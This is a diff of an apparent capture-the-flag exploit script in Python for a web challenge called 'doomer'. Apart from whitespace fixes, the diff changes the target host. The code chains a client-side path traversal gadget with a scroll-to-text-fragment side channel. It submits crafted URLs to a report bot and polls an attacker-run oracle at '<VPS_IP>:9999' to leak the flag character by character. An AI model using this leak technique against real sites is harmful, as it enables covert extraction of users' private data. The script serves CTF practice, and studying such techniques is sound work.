@@ -1,11 +1,11 @@
 from urllib.parse import quote
-import httpx 
-import random 
-import string 
-import time 
+import httpx
+import random
+import string
+import time
 
 def generate_random_creds() -> str:
-    username = "".join(random.choices(string.ascii_letters + string.digits, k=8)) 
+    username = "".join(random.choices(string.ascii_letters + string.digits, k=8))
     password = "".join(random.choices(string.ascii_letters + string.digits, k=8))
 
     return username, password
@@ -66,11 +66,11 @@ def STTF_Gadget(client: httpx.Client, username: str, REPORT_SERVER_URL: str, ORA
             print("[+] Flag: " + current_flag)
             break
 
-        char = charset[current_index] 
+        char = charset[current_index]
         payload = f"{REPORT_SERVER_URL}/users/@{username}#:~:text={current_flag[-1]}-,{char}"
 
         report(client, payload)
-        time.sleep(2.5) 
+        time.sleep(2.5)
 
         print("Trying: " + current_flag + char)
         if Oracle(client, ORACLE_SERVER_URL):
@@ -79,9 +79,9 @@ def STTF_Gadget(client: httpx.Client, username: str, REPORT_SERVER_URL: str, ORA
             print(f"[+] Exfiled character: {char}")
         else:
             current_index += 1
-    
+
 def exploit():
-    BASE_URL = "http://doomer.quals.scc2025.ctf.rs:1337"
+    BASE_URL = "http://doomer.playground.cyberhero.rs:1337"
     ORACLE_SERVER_URL = "http://<VPS_IP>:9999"
     REPORT_SERVER_URL = "http://web:1337"
 
@@ -99,7 +99,7 @@ def exploit():
     print("[+] Successfully triggered the CSPT Gadget.")
 
     print("[+] Triggering the STTF Gadget...")
-    STTF_Gadget(client, username, REPORT_SERVER_URL, ORACLE_SERVER_URL) 
+    STTF_Gadget(client, username, REPORT_SERVER_URL, ORACLE_SERVER_URL)
 
 if __name__ == "__main__":
     exploit()
